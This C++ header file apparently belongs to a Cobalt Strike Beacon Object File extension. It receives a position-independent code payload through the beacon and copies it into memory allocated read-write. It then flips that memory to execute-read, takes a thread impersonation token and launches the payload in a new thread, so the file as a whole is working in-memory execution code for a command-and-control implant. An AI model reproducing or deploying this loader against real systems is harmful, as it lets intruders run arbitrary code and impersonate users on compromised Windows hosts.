#pragma once
#include <Windows.h>
#include <pico/utils.h>
#include <pico/pico.h>
#include "beacon.h"
#include "utils/token.h"

static pic::vector<pic::Argument> parse_arguments(const char* fmt, datap& parser);

extern "C" {
	static pic::ThreadContext* find_available_thread_context(pic::ThreadRegistry* registry);
	static void* allocate_pic_memory(pic::ThreadContext* ctx, const void* payload, int payload_size, const char* name);
	static const uint8_t* find_thread_start_gadget();
	static bool start_pic_thread(pic::ThreadContext* ctx, const void* entry);
	

	static void handle_async(
		pic::ThreadRegistry& registry,
		datap& parser)
	{
		DFR_LOCAL(KERNEL32, VirtualFree);
		DFR_LOCAL(KERNELBASE, OutputDebugStringA);

		int payload_size = 0;

		const auto* payload =
			BeaconDataExtract(&parser, &payload_size);

		const auto* name =
			BeaconDataExtract(&parser, nullptr);

		const auto* format_string =
			BeaconDataExtract(&parser, nullptr);

		if (!payload || payload_size <= 0)
		{
			BeaconPrintf(CALLBACK_ERROR, "Invalid payload");
			return;
		}

		if (!name)
		{
			BeaconPrintf(CALLBACK_ERROR, "Missing name");
			return;
		}

		auto* ctx =
			find_available_thread_context(&registry);

		if (!ctx)
		{
			BeaconPrintf(CALLBACK_ERROR, "No slots available");
			return;
		}

		DBG_PRINT("[async] Before parse_arguments");
		ctx->args = parse_arguments(format_string, parser);
		DBG_PRINT("[async] After parse_arguments");

		auto mem =
			allocate_pic_memory(
				ctx,
				payload,
				payload_size,
				name);

		if (!mem)
		{
			BeaconPrintf(CALLBACK_ERROR, "Allocation failed");
			return;
		}

		if (!start_pic_thread(ctx, mem))
		{
			VirtualFree(mem, 0, MEM_RELEASE);
			BeaconPrintf(CALLBACK_ERROR, "Thread start failed");
			return;
		}

		DBG_PRINT("[async] PIC thread started successfully.");
	}

	pic::AsyncContext* get_or_create_async_data()
	{
		DFR_LOCAL(KERNEL32, VirtualAlloc);
		DFR_LOCAL(KERNEL32, InitializeCriticalSection);
		DFR_LOCAL(KERNEL32, InitializeConditionVariable);

		auto* buffer = BeaconGetValue("asyncdata");

		if (!buffer) {
			buffer = VirtualAlloc(
				nullptr,
				sizeof(pic::AsyncContext),
				MEM_COMMIT | MEM_RESERVE,
				PAGE_READWRITE);

			if (!buffer) {
				BeaconPrintf(
					CALLBACK_ERROR,
					"Failed to allocate thread registry.");
				return nullptr;
			}

			auto* async_data = reinterpret_cast<pic::AsyncContext*>(buffer);

			async_data->output = nullptr;
			InitializeCriticalSection(&async_data->mutex);
			InitializeConditionVariable(&async_data->cv);

			BeaconAddValue("asyncdata", buffer);
		}

		return static_cast<pic::AsyncContext*>(buffer);
	}

	static bool start_pic_thread(
		pic::ThreadContext* ctx,
		const void* entry)
	{
		DFR_LOCAL(KERNEL32, CreateThread);
		DFR_LOCAL(KERNEL32, CreateEventA);
		DFR_LOCAL(KERNELBASE, OutputDebugStringA);

		HANDLE token = nullptr;

		if (!acquire_thread_impersonation_token(token))
		{
			DBG_PRINT("[async] token acquisition failed");
		}

		ctx->impersonationToken = token;

		ctx->stop_event = CreateEventA(NULL, FALSE, FALSE, NULL);

		ctx->async = get_or_create_async_data();

		ctx->state.store(pic::ThreadState::Running);

		DWORD thread_id = 0;

		HANDLE thread = CreateThread(
			nullptr,
			0,
			reinterpret_cast<LPTHREAD_START_ROUTINE>(const_cast<void*>(entry)),
			ctx,
			0,
			&thread_id);

		if (!thread)
		{
			ctx->state.store(pic::ThreadState::Failed);
			return false;
		}

		ctx->id = thread_id;
		ctx->handle = thread;

		return true;
	}

	static void* allocate_pic_memory(
		pic::ThreadContext* ctx,
		const void* payload,
		int payload_size,
		const char* name)
	{
		DFR_LOCAL(KERNEL32, VirtualAlloc);
		DFR_LOCAL(KERNEL32, VirtualProtect);
		DFR_LOCAL(KERNEL32, VirtualFree);

		DFR_LOCAL(ntdll, memcpy);

		void* memory = VirtualAlloc(
			nullptr,
			payload_size,
			MEM_COMMIT | MEM_RESERVE,
			PAGE_READWRITE);

		if (!memory)
		{
			return nullptr;
		}

		ctx->location = memory;
		ctx->size = payload_size;
		ctx->name = pic::string<char>(name);

		memcpy(memory, payload, payload_size);

		DWORD old_protect = 0;

		if (!VirtualProtect(
			memory,
			payload_size,
			PAGE_EXECUTE_READ,
			&old_protect))
		{
			VirtualFree(memory, 0, MEM_RELEASE);
			return nullptr;
		}

		return memory;
	}

	static pic::ThreadContext* find_available_thread_context(pic::ThreadRegistry* registry) {
		DFR_LOCAL(KERNEL32, OutputDebugStringA);
		for (auto& i : registry->threads) {
			if (i.state == pic::ThreadState::Uninitialized) {
				return &i;
			}
		}
		return nullptr;
	}
}

static pic::vector<pic::Argument> parse_arguments(const char* fmt, datap& parser) {

	pic::vector<pic::Argument> args;

	if (!fmt) {
		BeaconPrintf(CALLBACK_ERROR, "No fmt string!");
		return args;
	}

	for (size_t i = 0; fmt[i] != '\0'; i++) {
		if (fmt[i] == 'b') {
			int size = 0;
			auto* ptr = BeaconDataExtract(&parser, &size);
			args.push_back(pic::Argument::make_binary(ptr, size));
		}
		else if (fmt[i] == 'i') {
			auto integer = BeaconDataInt(&parser);
			args.push_back(pic::Argument::make<pic::arg_int32>(integer));
		}
		else if (fmt[i] == 's') {
			auto integer = BeaconDataShort(&parser);
			args.push_back(pic::Argument::make<pic::arg_int16>(integer));
		}
		else if (fmt[i] == 'z') {
			auto string = BeaconDataExtract(&parser, nullptr);
			args.push_back(pic::Argument::make<pic::arg_string>(pic::string<char>(string)));
		}
		else if (fmt[i] == 'Z') {
			auto widestring = reinterpret_cast<wchar_t*>(BeaconDataExtract(&parser, nullptr));
			args.push_back(pic::Argument::make<pic::arg_wstring>(pic::string<wchar_t>(widestring)));
		}
	}

	return args;
}